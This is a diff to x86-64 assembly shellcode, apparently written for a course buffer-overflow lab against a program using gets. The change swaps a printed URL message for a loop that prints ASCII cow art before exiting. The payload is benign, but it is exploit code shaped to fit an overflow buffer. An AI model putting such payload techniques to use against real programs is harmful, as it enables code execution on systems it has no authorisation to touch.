@@ -44,25 +44,49 @@ mov rdx,message1_len
 ; send it
 syscall
 
+;
+; ; write the newline
+; mov rsi,newline_char
+; ; print just the single newline char
+; mov rdx,1
+; ; send it
+; syscall
+;
+; ; write the second line
+; mov rsi,message2
+; ; print just the single newline char
+; mov rdx,message2_len
+; ; send it
+; syscall
+;
 
-; write the newline
 mov rax,1
 mov rdi,1
 mov rsi,newline_char
-; print just the single newline char
 mov rdx,1
-; send it
 syscall
 
-; write the second line
-mov rax,1
-mov rdi,1
-mov rsi,message2
-; print just the single newline char
-mov rdx,message2_len
-; send it
-syscall
+mov r12,4
+mov rbx,cow1
 
+cow_loop:
+    ; make cow
+    mov rax,1
+    mov rdi,1
+    mov rsi,rbx
+    mov rdx,cow_len
+    syscall
+    mov rax,1
+    mov rdi,1
+    mov rsi,newline_char
+    mov rdx,1
+    syscall
+    add rbx,cow_len
+
+    dec r12
+    jnz cow_loop
+
+end_cow:
 
 ; Set rax to syscall number 60, exit. Unlike the in-class example, we don't have to worry
 ; about NULL bytes being in our attack code, as gets *only* stops at a newline.
@@ -86,9 +110,16 @@ message1_len equ $-message
 ; nl1 db 0xE2
 ; nl2 db 0x80
 ; nl3 db 0xA8
-message2 db "visit https://r.mtdv.me/videos/TLVPIoFKle for help"
+; message2 db "visit https://r.mtdv.me/videos/TLVPIoFKle for help"
 ; you can use the macro message_len to get the length of the message in bytes
-message2_len equ $-message2
+; message2_len equ $-message2
+
+cow1 db "        (__)"
+cow_len equ $-cow1
+cow2 db "`\------(oo)"
+cow3 db "  ||    (__)"
+cow4 db "  ||w--||"
+
 message_len equ $-message
 
 ; == END OF DATA EMBEDDED IN ATTACK BUFFER, START OF PADDING TO END OF BUFFER ==
